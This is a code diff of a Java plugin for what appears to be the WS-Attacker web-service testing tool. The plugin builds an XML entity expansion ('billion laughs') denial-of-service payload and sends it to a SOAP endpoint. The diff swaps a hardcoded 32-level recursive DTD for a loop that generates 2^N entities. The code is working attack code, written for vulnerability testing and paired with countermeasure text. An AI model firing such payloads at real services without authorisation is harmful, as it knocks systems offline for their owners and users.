@@ -27,119 +27,116 @@ import java.util.HashMap;
 import java.util.Map;
 import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
 
-public class XmlEntityExpansion extends AbstractDosPlugin {
+public class XmlEntityExpansion
+    extends AbstractDosPlugin
+{
 
     private static final long serialVersionUID = 1L;
+
     // Custom Attributes
     private AbstractOptionInteger optionExponent;
 
     @Override
-    public void initializeDosPlugin() {
+    public void initializeDosPlugin()
+    {
         initData();
         // Custom Initilisation
-        optionExponent = new OptionLimitedInteger("Number of entities (power of 2)", 20, "Exponent for calculating the number of entities (total entities = 2^Param8)", 1, 200);
-        getPluginOptions().add(optionExponent);
+        optionExponent =
+            new OptionLimitedInteger( "Number of entities (power of 2)", 20,
+                                      "Exponent for calculating the number of entities (total entities = 2^Param8)", 1,
+                                      200 );
+        getPluginOptions().add( optionExponent );
+    }
+
+    public AbstractOptionInteger getOptionNumberOfEntities()
+    {
+        return optionExponent;
     }
 
     @Override
-    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
-        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENTATTRIBUTES;
+    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
+    {
+        return OptionTextAreaSoapMessage.PayloadPosition.BODYLASTCHILDELEMENT;
     }
 
-    public void initData() {
-        setName("XML Entity Expansion (recursive)");
-        setDescription("This attack checks whether or not a Web service is vulnerable to the \"XML Entity Expansion\" attack.\n"
-          + "A vulnerable Web service runs out of resources when trying to resolve a large amount of recursively defined entities.\n"
-          + "The entities are defined in the Document Type Definition (DTD)\n"
-          + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion"
-          + "\n\n"
-          + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
-          + "with an attribute that uses an entity that will start the recursive process.\n"
-          + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"
-          + "\n\n"
-          + "The number of entitites defines the exponent that is used for calculating the number of resulting XML entities. "
-          + "The base is 2.\n"
-          + "- Input 10 will result in  2^10 = 1024 entities."
-          + "- Input 15 will result in  2^10 = 32768 entities."
-          + "- Input 20 will result in  2^10 = 1048576 entities."
-          + "- Input 25 will result in  2^10 = 33554432 entities."
-          + "\n\n");
-        setCountermeasures("In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
-          + "Apache Axis2 1.5.2 is known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore");
+    public void initData()
+    {
+        setName( "XML Entity Expansion (recursive)" );
+        setDescription( "This attack checks whether or not a Web service is vulnerable to the \"XML Entity Expansion\" attack.\n"
+            + "A vulnerable Web service runs out of resources when trying to resolve a large amount of recursively defined entities.\n"
+            + "The entities are defined in the Document Type Definition (DTD)\n"
+            + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion"
+            + "\n\n"
+            + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
+            + "with an attribute that uses an entity that will start the recursive process.\n"
+            + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"
+            + "\n\n"
+            + "The number of entitites defines the exponent that is used for calculating the number of resulting XML entities. "
+            + "The base is 2.\n"
+            + "- Input 10 will result in  2^10 = 1024 entities."
+            + "- Input 15 will result in  2^10 = 32768 entities."
+            + "- Input 20 will result in  2^10 = 1048576 entities."
+            + "- Input 25 will result in  2^10 = 33554432 entities." + "\n\n" );
+        setCountermeasures( "In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
+            + "Apache Axis2 1.5.2 is known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore" );
     }
 
     @Override
-    public void createTamperedRequest() {
+    public void createTamperedRequest()
+    {
 
         // get Message
         String soapMessageFinal;
         String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
 
         // inset payload entity in envelope
-        String attribute = "entityAttack=\"&x1;\"";
-        soapMessage = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, attribute);
+        // String attribute = "entityAttack=\"&x1;\"";
+        // soapMessage =
+        // this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage,
+        // attribute);
 
         // prepend DTD to message
-//	StringBuilder sb = new StringBuilder();
-//	sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
-//	sb.append("<!DOCTYPE Envelope [");
-//	sb.append("<!ENTITY x"+optionExponent.getValue()+" \"Fo\">");
-//	for (int i = 1; i < optionExponent.getValue(); i++) {
-//	    sb.append("<!ENTITY x"+(optionExponent.getValue()-i)+" \"&x"+(optionExponent.getValue()-i+1)+";&x"+(optionExponent.getValue()-i+1)+";\">");
-//	}
-//	sb.append("]>");
-//	sb.append(soapMessage);
-//	sb.append("\r\n\r\n");
-//	soapMessageFinal = sb.toString();
-
         StringBuilder sb = new StringBuilder();
-        sb.append("<!DOCTYPE root [");
-        sb.append("<!ENTITY x32 \"foobar\">");
-        sb.append("<!ENTITY x31 \"&x32;&x32;\">");
-        sb.append("<!ENTITY x30 \"&x31;&x31;\">");
-        sb.append("<!ENTITY x29 \"&x30;&x30;\">");
-        sb.append("<!ENTITY x28 \"&x29;&x29;\">");
-        sb.append("<!ENTITY x27 \"&x28;&x28;\">");
-        sb.append("<!ENTITY x26 \"&x27;&x27;\">");
-        sb.append("<!ENTITY x25 \"&x26;&x26;\">");
-        sb.append("<!ENTITY x24 \"&x25;&x25;\">");
-        sb.append("<!ENTITY x23 \"&x24;&x24;\">");
-        sb.append("<!ENTITY x22 \"&x23;&x23;\">");
-        sb.append("<!ENTITY x21 \"&x22;&x22;\">");
-        sb.append("<!ENTITY x20 \"&x21;&x21;\">");
-        sb.append("<!ENTITY x19 \"&x20;&x20;\">");
-        sb.append("<!ENTITY x18 \"&x19;&x19;\">");
-        sb.append("<!ENTITY x17 \"&x18;&x18;\">");
-        sb.append("<!ENTITY x16 \"&x17;&x17;\">");
-        sb.append("<!ENTITY x15 \"&x16;&x16;\">");
-        sb.append("<!ENTITY x14 \"&x15;&x15;\">");
-        sb.append("<!ENTITY x13 \"&x14;&x14;\">");
-        sb.append("<!ENTITY x12 \"&x13;&x13;\">");
-        sb.append("<!ENTITY x11 \"&x12;&x12;\">");
-        sb.append("<!ENTITY x10 \"&x11;&x11;\">");
-        sb.append("<!ENTITY x9 \"&x10;&x10;\">");
-        sb.append("<!ENTITY x8 \"&x9;&x9;\">");
-        sb.append("<!ENTITY x7 \"&x8;&x8;\">");
-        sb.append("<!ENTITY x6 \"&x7;&x7;\">");
-        sb.append("<!ENTITY x5 \"&x6;&x6;\">");
-        sb.append("<!ENTITY x4 \"&x5;&x5;\">");
-        sb.append("<!ENTITY x3 \"&x4;&x4;\">");
-        sb.append("<!ENTITY x2 \"&x3;&x3;\">");
-        sb.append("<!ENTITY x1 \"&x2;&x2;\">");
-        sb.append("]>");
-        sb.append("root attr=\"&x1;\"/>"); // \r\n\r\n
-        soapMessageFinal = sb.toString();
-
-        // get HeaderFields from original request, if required add custom headers - make sure to clone!
-        Map<String, String> httpHeaderMap = new HashMap<String, String>();
-        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
-            httpHeaderMap.put(entry.getKey(), entry.getValue());
+        sb.append( "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" );
+        sb.append( "<!DOCTYPE " );
+        sb.append( "Envelope [" );
+        sb.append( "<!ENTITY x0 \"Fo\">" );
+        int value = optionExponent.getValue();
+        for ( int element = 1; element < value; element++ )
+        {
+            sb.append( "<!ENTITY x" + element + " \"&x" + ( element - 1 ) + ";&x" + ( element - 1 ) + ";\">" );
         }
-        httpHeaderMap.put("Content-Type", "application/xml; charset=UTF-8"); //; charset=UTF-8"
+        sb.append( "]" );
+        sb.append( ">" );
+        sb.append( this.getOptionTextAreaSoapMessage().getValue() );
+        // sb.append("\r\n\r\n");
+        soapMessage = sb.toString();
+        soapMessageFinal =
+            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage,
+                                                                               "<s>&x" + ( value - 1 ) + ";</s>" );
 
+        // sb = new StringBuilder();
+        // sb.append("<!DOCTYPE root [");
+        // sb.append("<!ENTITY x32 \"foobar\">");
+        // for (int i = 32; i > 0; i--) {
+        // sb.append("<!ENTITY x" + (i - 1) + " \"&x" + i + ";&x" + i + ";\">");
+        // }
+        // sb.append("]>");
+        // sb.append("root attr=\"&x1;\"/>"); // \r\n\r\n
+        // soapMessageFinal = sb.toString();
+
+        // get HeaderFields from original request, if required add custom
+        // headers - make sure to clone!
+        Map<String, String> httpHeaderMap = new HashMap<String, String>();
+        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
+        {
+            httpHeaderMap.put( entry.getKey(), entry.getValue() );
+        }
+        httpHeaderMap.put( "Content-Type", "application/xml; charset=UTF-8" ); // ;
+                                                                               // charset=UTF-8"
 
         // write payload and header to TamperedRequestObject
-        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
+        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );
 
     }
     // ----------------------------------------------------------
